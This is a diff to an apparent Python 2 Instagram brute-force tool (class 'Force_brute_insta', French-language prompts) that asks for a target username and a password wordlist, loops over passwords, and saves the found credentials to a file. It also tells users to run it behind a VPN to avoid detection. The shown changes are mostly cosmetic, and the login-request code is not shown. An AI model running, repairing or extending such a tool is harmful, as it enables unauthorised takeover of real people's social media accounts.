@@ -184,24 +184,23 @@ class Force_brute_insta(object):
         _cls()
         print(logo_robot)
         print("\033[1;97m╔════════════════════════════════════════════╗")
-        print("\033[1;97m║ \033[1;91m[\033[1;93m+\033[1;91m]\033[38;5;111m La bonne gestion dépend du logiciel VPN.")
+        print("\033[1;97m║ \033[1;91m[\033[1;93m+\033[1;91m]\033[38;5;127m La bonne gestion dépend du logiciel VPN║")
         try:
-            print("\033[1;97m║ \033[1;91m[\033[1;93m+\033[1;91m]\033[38;5;221m Veuillez l'utiliser avant toute chose.")
+            print("\033[1;97m║ \033[1;91m[\033[1;93m+\033[1;91m]\033[38;5;221m Veuillez l'utiliser avant toute chose. ║")
             print("\033[1;97m║")
-            utilisateur = raw_input("\033[1;97m╚═\033[1;31m▶\033[38;5;245m Entrer le nom d'utilisateur instagram\033[1;97m╬══\033[1;91m► \033[1;95m" )
+            utilisateur = raw_input("\033[1;97m╚═\033[1;31m▶\033[38;5;245m Nom d'utilisateur cible instagram    \033[1;97m═╬══\033[1;91m► \033[1;95m" )
+            print("\033[1;97m║ \033[1;91m[\033[1;93m+\033[1;91m]\033[38;5;111m Wordliste par defaut \033[1;91m:\033[38;5;135m faxel.txt")
+            _wordliste  = raw_input("\033[1;97m╚═\033[1;31m▶\033[38;5;245m Entrer l'emplacement de la wordliste \033[1;97m═╬══\033[1;91m► \033[1;96m" )
             print("\033[1;97m║")
-            _wordliste  = raw_input("\033[1;97m╚═\033[1;31m▶\033[38;5;245m Entrer l'emplacement de la wordliste \033[1;97m╬══\033[1;91m► \033[1;96m" )
-            print("\033[1;97m║")
-            print("\033[1;97m╬═══╬═══╬═══╬═══╬═══╬═══╬")        
-        #except:
-        #    print("\033[1;91m[\033[1;93m+\033[1;91m]\033[1;97m Erreur inexpliquable.")
-        #    quitter()
+            print("\033[1;97m╬═══╬═══╬═══╬═══╬═══╬═══╬══╬═══╬═══╬═══╬═══╬═══╬")        
             _save = open(_wordliste,"r")
             _passwordliste = _save.read().splitlines()
-            load("\033[1;91m[\033[1;92m@\033[1;91m]\033[38;5;245m Server\033[38;5;214m Faxel\033[38;5;241m...\033[48;5;0;38;5;192m")
-            print("\n")
+            load("\033[1;91m[\033[1;92m@\033[1;91m]\033[38;5;245m Serveur\033[38;5;214m Faxel\033[38;5;241m...\033[48;5;0;38;5;192m")
+            _cls()
+            print(logo_robot)
+            print("═══════════════════════════════════════════════════════\n")
         except IOError:
-            print("\033[1;91m[\033[1;93m*\033[1;91m]\033[1;97m Wordliste introuvable.")
+            print("\n\033[1;91m[\033[1;93m*\033[1;91m]\033[1;91m Wordliste introuvable.")
             time.sleep(2)
             Force_brute_insta()
         fil_general = []
@@ -244,22 +243,6 @@ class Force_brute_insta(object):
                 print("\033[1;91m[\033[1;93m*\033[1;91m]\033[1;97m "+ utilisateur + "\033[1;91m: \033[1;93m" + pwd + "\033[1;91m -->\033[1;97m Bon il faut vérifier")
                 with open("Faxelh.txt", "a") as sauves:
                     sauves.write("#Faxel\n" + utilisateur + ":" + pwd + "\n")
-            #else:
-            #    print("\n\033[1;91m[\033[1;93m+\033[1;91m]\033[1;97m Veuillez utiliser un VPN puissant, puis ressayez.")
-            #    print("\033[1;97m╔════════════════════════════════════════════╗")
-            #    print("\033[1;97m║")
-            #    h = raw_input("\033[1;97m╚═\033[1;31m▶\033[38;5;136m Si vous avez changer de vpn taper\033[1;92m o\033[1;97m sinon taper\033[1;91m n \033[1;97m═╬══\033[1;91m► \033[38;5;245m" )
-            #    if h=="o" or h=="O":
-            #        Force_brute_insta()
-            #    elif h=="n" or h=="N":
-            #        quitter()
-            #    else:
-            #        _cls()
-            #        print(logo_robot)
-            #        print("\n")
-            #        os.system("xdg-open https://www.youtube.com/c/FASTERAXEL?sub_confirmation=1")
-            #        raw_input("\033[1;97m Bye Mec, n'oublie pas de t'abonner et d'activer la cloche 🔔")
-            #        quitter()
 #####################################################################################################
 ####################################################################################################            
 if __name__ == "__main__":
